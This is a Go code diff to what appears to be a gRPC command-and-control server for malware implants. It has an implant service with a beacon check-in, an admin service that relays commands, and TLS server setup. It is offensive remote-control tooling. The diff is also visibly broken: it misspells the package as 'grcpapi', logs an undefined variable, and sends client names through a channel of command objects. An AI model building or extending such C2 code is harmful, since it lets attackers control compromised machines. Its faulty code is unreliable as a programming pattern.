@@ -19,7 +19,7 @@ import (
 )
 
 type implantServer struct {
-        work, output chan *grpcapi.Command
+        work, output, clientName chan *grpcapi.Command
 }
 
 type adminServer struct {
@@ -75,26 +75,10 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 
 }
 
-func (s *implantServer) RegisterClient(ctx context.Context) (string, error) {
-	if md, ok := metadata.FromIncomingContext(ctx); ok {
-		clientName := strings.Join(md["name"], "")
-		log.Printf("New beacon: %s", clientName)
-		return "200 ",nil
-	}
-	return "", fmt.Errorf("missing name")
-}
-
-func unaryInterceptor(ctx context.Context, req interface{}, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler) (interface{}, error) {
-	s, ok := info.Server.(*api.Server)
-	if !ok {
-		return nil, fmt.Errorf("unable to cast server")
-	}
-	clientID, err := RegisterClient(ctx, s)
-	if err != nil {
-		return nil, err
-	}
-	ctx = context.WithValue(ctx, clientID, nil)
-	return handler(ctx, req), nil
+func (s *implantServer) RegisterImplant(ctx context.Context, checkIn *grcpapi.Command) (*grpcapi.Empty, error) {
+	s.clientName <- checkIn
+	log.Printf("New beacon: %s", clientName)
+	return &grpcapi.Empty{},nil
 }
 
 func main() {
@@ -137,10 +121,10 @@ func main() {
                 log.Fatal(err)
         }
 
-        serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig)),grpc.unaryInterceptor(unaryInterceptor)}
+        serverOption := []grpc.ServerOption{grpc.Creds(credentials.NewTLS(tlsConfig))}
 
         grpcImplantServer := grpc.NewServer(serverOption)
-        grpcAdminServer := grpc.NewServer(opts)
+        grpcAdminServer := grpc.NewServer(opts...)
         grpcapi.RegisterImplantServer(grpcImplantServer, implant)
         grpcapi.RegisterAdminServer(grpcAdminServer, admin)
 
